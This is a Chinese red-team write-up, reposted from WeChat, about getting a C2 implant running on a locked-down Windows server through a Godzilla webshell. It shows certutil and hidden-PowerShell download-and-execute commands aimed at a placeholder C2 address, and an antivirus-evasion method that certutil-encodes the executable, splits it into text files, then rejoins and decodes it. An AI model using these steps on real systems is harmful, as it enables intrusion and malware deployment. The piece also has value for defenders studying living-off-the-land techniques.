<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/l-QJyl2NDxi7y94-k-cRrg)

免责声明

  

  

**本文仅用于技术讨论与学习，利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，文章作者不为此承担任何责任。**

**只供对已授权的目标使用测试，对未授权目标的测试作者不承担责任，均由使用本人自行承担。**

![](https://mmbiz.qpic.cn/mmbiz_png/0x3kGZxwKTkyY7BrNkUwicjIkq3F2xlCIgGz7pBpnEMh3rvpbyH2DE2kIKVste0B2yP8TiavoOsuo9sMQKSj9uxQ/640?wx_fmt=png)

文章正文

  

  

0# 概述
=====

在前期 Web 打点成功获得对应权限后，就进入了后渗透（提权、内网渗透、域渗透）的阶段，但是在有些时候，总会出现各种各样奇怪的情况，在此也分享一些经验出来。

最近团队师傅找到我，想要让我帮忙提权一个站点，正好用上了这个骚操作，看网上好像都没有人记录这个手法，这边就浅浅记录一下，希望能帮助到屏幕前面的你。

1# 情况描述
=======

通过某供应商服务系统的文件任意上传 1day，上传了一个哥斯拉（`Godzilla`）的 Asp 马，并成功连接上了 WebShell，但是权限很低很低：

![](https://mmbiz.qpic.cn/mmbiz_png/h8P1KUHOKub9k1rSP0buLqyR2fYWia6LUBv0en99G5LnTWicqyWuWCjeXDibSnzs8VxFC3QddFOOaPJicNhIx2N9Bg/640?wx_fmt=png)文件上传骚姿势 - 情况分析. png

*   • WebShell 连接方式：直接连接 IP: 端口的，中间不可能有 WAF 存在（有些人真的扯）
    
*   • 目标系统：Microsoft Windows Server 2016 Datacenter
    
*   • whoami：`iis apppool\*****scm4`
    
*   • 文件管理情况：WebShell 只能上传写入 TXT 和图片类型文件，且大文件无法上传、移动和删除 **（注意！！！服务器做了限制。除了 TXT 和图片，其他所有文件都上传不了！！！即便是一个普通的小程序，也是上传失败！）**
    
*   • 命令使用情况：无法使用 PowerShell 和其他高危指令
    
*   • 杀软情况：Microsoft Security Essentials（`MsMpEng.exe`）/ 火绒（`usysdiag.exe`）/Microsoft Internet Security（`MSASCui.exe`）
    
*   • 网络连接情况：目标系统对外只能访问白名单 URL，不在白名单没法访问
    

![](https://mmbiz.qpic.cn/mmbiz_png/h8P1KUHOKub9k1rSP0buLqyR2fYWia6LUGnbM5Yll6DKchrwRcXgZywMzfic7b4QncPa3EEjGsW7goGYVtek5xWA/640?wx_fmt=png) helloworld-1.png

我尝试通过 WebShell 更换目录上传 EXE，甚至上传一个 HelloWorld 的 EXE 文件，都无法上传，这个情况我也是第一次碰到，后面要好好再分析一下原因。

![](https://mmbiz.qpic.cn/mmbiz_png/h8P1KUHOKub9k1rSP0buLqyR2fYWia6LUpZL587qrGS9abe1Lh4VU5d4YaTIoia8jEcticTPCViaM8ibYq3gMDOibX6A/640?wx_fmt=png)helloworld-2.png

2# 情况分析
=======

通常来说，在红蓝攻防中 Web 打点成功后，一般会上传 C2 并上线清理入侵痕迹，然后再去搜索敏感文件以及对内网资产进行探查。

**上传 C2 到服务器一般有以下操作（针对 Win）：**

1.  1. **通过 WebShell 上传 C2 文件并执行**
    
2.  2. **通过 `Certutil` 远程下载 C2 文件并执行**
    
3.  3. **通过 `PowerShell` 远程下载 C2 文件并执行**
    

通过 `Certutil` 远程下载 C2 文件并执行

```
certutil -urlcache -gmt -split -f http://C2文件远程地址 C2文件名.exe && C2文件名.exe 执行参数

```

通过 `PowerShell` 远程下载 C2 文件并执行

```
powershell.exe -ExecutionPolicy bypass -noprofile -windowstyle hidden (new-object system.net.webclient).downloadfile('http://C2文件远程地址','C2文件名.exe') && C2文件名.exe 执行参数

```

但我们目前的情况，虽然 Web 打点成功了，但是没办法写入或者下载 C2 进行上线（测试过了，几种文件远程下载的指令都被杀软拦截或者被系统屏蔽了），WebShell 也没办法上传 C2 可执行文件 **（服务器做了限制。除了 TXT 和图片，其他所有文件都上传不了！！！即便是一个普通的小程序，也是上传失败！）**

这种情况，上线 C2 都基本不可能了，更别说提权和内网渗透了

3# C2 上传执行骚姿势
=============

综上所述，这个权限已经是很低很低了，但不慌，我们看看有什么办法能突破

首先我们先要了解一个 Windows 系统的自带工具：`Certutil`

`certutil.exe` 是一个合法 Windows 文件，用于管理 Windows 证书的程序。

微软官方是这样对它解释的：

> Certutil.exe 是一个命令行程序，作为证书服务的一部分安装。  
> 您可以使用 Certutil.exe 转储和显示证书颁发机构（CA）配置信息，配置证书服务，备份和还原 CA 组件以及验证证书，密钥对和证书链。

但是此合法 Windows 服务, 现已被广泛滥用于恶意用途

很多人只知道可以通过 `Certutil` 进行远程下载文件（会被杀软拦截），但不知道它还能加密解密本地文件（不会报毒，可以用来 ByPassAV）

那我就通过本次实战案例，给大家演示一下整个 ByPass 过程：

3.1 加密 C2 可执行文件
---------------

首先，准备好 C2 可执行文件，通过 `Certutil` 进行加密导出

```
Certutil -encode C2可执行文件名.exe out.txt

```

![](https://mmbiz.qpic.cn/mmbiz_png/h8P1KUHOKub9k1rSP0buLqyR2fYWia6LUzticAJgO3yL3A664zsYU8iaJO1narK20TbGeyr6vklZzj88h28EzZalg/640?wx_fmt=png)加密导出. png

可以打开导出的 TXT，看到文件有如下特征：

![](https://mmbiz.qpic.cn/mmbiz_png/h8P1KUHOKub9k1rSP0buLqyR2fYWia6LUibTsDUMxpyo4hDQoXXibAB49u6mj9Oricw0ibsicyxMCxRE2SFq7AS6BtRQ/640?wx_fmt=png)加密导出特征. png

```
-----BEGIN CERTIFICATE-----
加密后的内容
-----END CERTIFICATE-----

```

3.2 切割 TXT 文件上传并拼接、解密
---------------------

因为上面说了，太大的文件没办法通过 WebShell 上传写入，于是让我们测试一下极限：

先试试 2000 行能否写入：

![](https://mmbiz.qpic.cn/mmbiz_png/h8P1KUHOKub9k1rSP0buLqyR2fYWia6LUVaxl1MvGUfdiacohtWaoPqYWia7Y4lOu5Yt5yXowicETn4fU9aZy93ywg/640?wx_fmt=png)测试写入保存成功. png

2000 行的数据写入是没问题的，那 3000 行呢？

![](https://mmbiz.qpic.cn/mmbiz_png/h8P1KUHOKub9k1rSP0buLqyR2fYWia6LUd0k5dZsPe8cm0LQ4onJaEHyDQicQYIkMLxd7dibOqeEV8IVvP0nh4Xiag/640?wx_fmt=png)测试写入保存失败. png

看，保存失败了，所以我们要将 TXT 切割后上传再拼接

随便去网上下载一个 TXT 切割器，如下：

![](https://mmbiz.qpic.cn/mmbiz_png/h8P1KUHOKub9k1rSP0buLqyR2fYWia6LUz0ddpOVswEibls8ibib3o4iaetdmgy9ctWPmuGMIuCzT8AyrmOgg1ZwJMw/640?wx_fmt=png)TXT 分割. png

好机会，切割出 67 个 TXT，在服务器上新建一个文件夹，全部上传上去：

![](https://mmbiz.qpic.cn/mmbiz_png/h8P1KUHOKub9k1rSP0buLqyR2fYWia6LUOmJu1zmcKJhxCMuGuNCPIic6IEO5rriaibvdic77MlNDuFZ2aHrTQNDOgw/640?wx_fmt=png)上传 TXT.png

再使用 `copy` 命令进行拼接：

```
copy 1.txt + 2.txt + 3.txt + 4.txt + 5.txt + 6.txt + 7.txt + 8.txt + 9.txt + 10.txt out10.txt  //out10.txt：合并1~10的前十个文件
copy 11.txt + 12.txt + 13.txt + 14.txt + 15.txt + 16.txt + 17.txt + 18.txt + 19.txt + 20.txt out20.txt //out20.txt：合并11~20的前十个文件
//如此往复，按照10个每组合并完成

```

注意：这里不能用通配符（*.txt）进行 `copy` ，因为这样会打乱文件顺序，就解密不了了

因为怕出错，我每 10 个文件 `copy` 一下，然后可以生成以下文件：

![](https://mmbiz.qpic.cn/mmbiz_png/h8P1KUHOKub9k1rSP0buLqyR2fYWia6LU50EeicXCICunrNM7bMZzGBq1pytV1TTlHJElw6PQQOPrY6mbKKbveTw/640?wx_fmt=png)copy 合并第一次. png

确认无误后，再用 `copy` 命令再合并一次：

```
copy out10.txt + out20.txt + out30.txt + out40.txt + out50.txt + out60.txt + out67.txt output.txt //合并总的文件

```

最后输出 `output.txt` 用 `Certutil` 进行解密操作即可：

```
Certutil -decode output.txt C2可执行文件名.exe

```

![](https://mmbiz.qpic.cn/mmbiz_png/h8P1KUHOKub9k1rSP0buLqyR2fYWia6LUWzzn51ia8PrRIHAJ9Im7ylPOumsKt2LCKkZDrPY3OB8iadTEdSpA1mfQ/640?wx_fmt=png)解密导出. png

3.3 执行 C2 文件上线机器
----------------

上面已经成功将 C2 可执行文件解密出来了，然后执行上线即可：

![](https://mmbiz.qpic.cn/mmbiz_png/h8P1KUHOKub9k1rSP0buLqyR2fYWia6LUdc9lTSUKwYCkbCfr5Xap2DlRToib1bdnUnAkk3JhicKriargjcHPAQQ1w/640?wx_fmt=png)成功上线 - 1.png![](https://mmbiz.qpic.cn/mmbiz_png/h8P1KUHOKub9k1rSP0buLqyR2fYWia6LUicfQdO2SJAPMmw7iaLfBPzm8ZzCeDX1E4Sd5luHTOHo74CTBAibplwWoA/640?wx_fmt=png) 成功上线 - 2.png

4# 总结
=====

很多时候，虽然看似 “山穷水尽疑无路”，但仔细钻研，还是能 “柳暗花明又一村”，有时候换个思路，可能就可以突破目前的困境。

在后渗透过程中， `Certutil` 虽然可以进行远程下载文件（但会被杀软拦截），但它还能加密和解密本地文件（不会报毒，可以用来 ByPassAV），这种思路在后渗透阶段还是值得学习和深入拓展的

**在本次实战情况下，面对苛刻的服务器条件，虽然没搞明白是如何做到让我无法通过 WebShell 上传 EXE 的，但是通过 `Certutil` 的加密解密机制，还是成功写入了 C2 可执行文件并上线提权，这不妨也是一种收获。**

本文转自 https://blog.zgsec.cn/index.php/archives/158/

![](https://mmbiz.qpic.cn/mmbiz_png/0x3kGZxwKTkyY7BrNkUwicjIkq3F2xlCIgGz7pBpnEMh3rvpbyH2DE2kIKVste0B2yP8TiavoOsuo9sMQKSj9uxQ/640?wx_fmt=png)

技术交流

  

  

知识星球

  

  

**致力于红蓝对抗，实战攻防，星球不定时更新内外网攻防渗透技巧，以及最新学习研究成果等。常态化更新最新安全动态。专题更新奇技淫巧小 Tips 及实战案例。  
**

**涉及方向包括 Web 渗透、免杀绕过、内网攻防、代码审计、应急响应、云安全。星球中已发布 200+ 安全资源，针对网络安全成员的普遍水平，并为星友提供了教程、工具、POC&EXP 以及各种学习笔记等等。**

![](https://mmbiz.qpic.cn/mmbiz_png/h8P1KUHOKuYmNKGiac5jzvbTTnwhGXXI8mTRm3Hd4PqNKiaZqbxC4rDiaVvxllH9ic3ibV5YJZYX15mTEw0libLS3AsA/640?wx_fmt=png)

交流群

  

  

关注公众号回复 “**加群**”，添加 Z2OBot 小 K 自动拉你加入 **Z2O 安全攻防交流群**分享更多好东西。

![](https://mmbiz.qpic.cn/mmbiz_png/h8P1KUHOKuYMO5aHRB3TbIy3xezlTAkbFzqIRfZNnicxSC23h1UmemDu9Jq38xrleA6NyoWBu1nAj0nmE6YXEHg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/h8P1KUHOKubEBT4bUSeGS6micuPMlUoN1AxpTK5kx2CY2uDNuyvk0Ce2a82UjWrZxkQneexdbrYBLD3W8g2N4JA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)![](https://mmbiz.qpic.cn/mmbiz_png/h8P1KUHOKubEBT4bUSeGS6micuPMlUoN1vd7kGCw2KeNFhicuQunVRDXhWHtDbp7tVRTL5lxPibjePvPrTVa3RjlQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

  

  

关注我们

  

  

**关注福利：**  

**回复 “****app****" 获取  app 渗透和 app 抓包教程**

**回复 “****渗透字典** **" 获取 针对一些字典重新划分处理，收集了几个密码管理字典生成器用来扩展更多字典的仓库。**

**回复 “****书籍** **" 获取 网络安全相关经典书籍电子版 pdf**

****回复 “资料** **" 获取 网络安全、渗透测试相关资料文档****

往期文章

  

  

[**我是如何摸鱼到红队的**](http://mp.weixin.qq.com/s?__biz=Mzg2ODYxMzY3OQ==&mid=2247489526&idx=1&sn=f52e17f5eb4790395a88a8e64c2a15e4&chksm=cea8fcb6f9df75a03fcf710a7369d8e761a1f8e5ae882709292c49103f22eefeb3a534388cd3&scene=21#wechat_redirect)  

[**命令执行漏洞 [无] 回显 [不] 出网利用技巧**](http://mp.weixin.qq.com/s?__biz=Mzg2ODYxMzY3OQ==&mid=2247488092&idx=1&sn=07ad5a0c09715ca03362bdcacc17f1e1&chksm=cea8f91cf9df700a68c747e2d7185efad50f380f93257293b9b96b5d87dc52cb2082560b0f0f&scene=21#wechat_redirect)  

[**MSSQL 提权全总结**](http://mp.weixin.qq.com/s?__biz=Mzg2ODYxMzY3OQ==&mid=2247488864&idx=1&sn=4888dcec05c0c5c8bc9d3b34136930c0&chksm=cea8fe20f9df7736e03b8544955533ac32671b845ff61d24dc51b5d787960d28256a833350d0&scene=21#wechat_redirect)  

[**Powershell 免杀过 defender 火绒，附自动化工具**](http://mp.weixin.qq.com/s?__biz=Mzg2ODYxMzY3OQ==&mid=2247484469&idx=1&sn=bdac380ee95fd0ef72581a3b60da1443&chksm=cea8ef75f9df66630e2148be842428802b27bcee1cb09748cbc200046742b8052cb6f873e115&scene=21#wechat_redirect)  

[**一篇文章带你学会容器逃逸**](http://mp.weixin.qq.com/s?__biz=Mzg2ODYxMzY3OQ==&mid=2247486670&idx=1&sn=6822dd40dcc20121fce0c42188fcd49a&chksm=cea8e78ef9df6e987896bdbd6b7a96c48992782657680574d7015d72984e7ca67a25a0aeea5d&scene=21#wechat_redirect)  

[**域渗透 | kerberos 认证及过程中产生的攻击**](http://mp.weixin.qq.com/s?__biz=Mzg2ODYxMzY3OQ==&mid=2247483720&idx=1&sn=157c5a4c172315af343bd253bc66da7c&chksm=cea8ea08f9df631e96faca7437a2b1e1900973dfd3b8d3501a666afcd8b05d6d16b8642aabc7&scene=21#wechat_redirect)  

[**通过 DCERPC 和 ntlmssp 获取 Windows 远程主机信息**](http://mp.weixin.qq.com/s?__biz=Mzg2ODYxMzY3OQ==&mid=2247488097&idx=1&sn=cf1e6965c78c9b4636ba15d2bd752655&chksm=cea8f921f9df7037e1e54ae11e03e18562da87309414c0fac3d8bc581bebe69d96cc5fdfce1d&scene=21#wechat_redirect)